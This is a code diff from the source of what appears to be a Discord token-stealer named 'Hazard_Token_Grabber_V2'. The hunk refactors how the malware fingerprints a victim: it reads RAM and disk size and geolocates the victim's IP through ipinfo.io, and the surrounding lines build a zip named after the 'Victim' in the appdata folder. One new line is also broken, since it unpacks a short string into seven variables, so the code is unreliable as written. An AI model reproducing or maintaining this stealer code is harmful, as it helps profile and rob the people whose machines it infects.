@@ -492,15 +492,15 @@ class Hazard_Token_Grabber_V2(functions):
         wkey = w[1].replace(" ", "᠎ ")
         ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
         disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
-        # ip, country, city, region, googlemap = "None"
+        ip, city, country, region, org, loc, googlemap = "N/A"
         data = httpx.get("https://ipinfo.io/json").json()
         ip = data.get('ip')
         city = data.get('city')
         country = data.get('country')
         region = data.get('region')
         org = data.get('org')
-        googlemap = "https://www.google.com/maps/search/google+map++" + \
-            data.get('loc')
+        loc = data.get('loc')
+        googlemap = "https://www.google.com/maps/search/google+map++" + loc
 
         _zipfile = os.path.join(
             self.appdata, f'Hazard.V2-[{Victim}].zip')
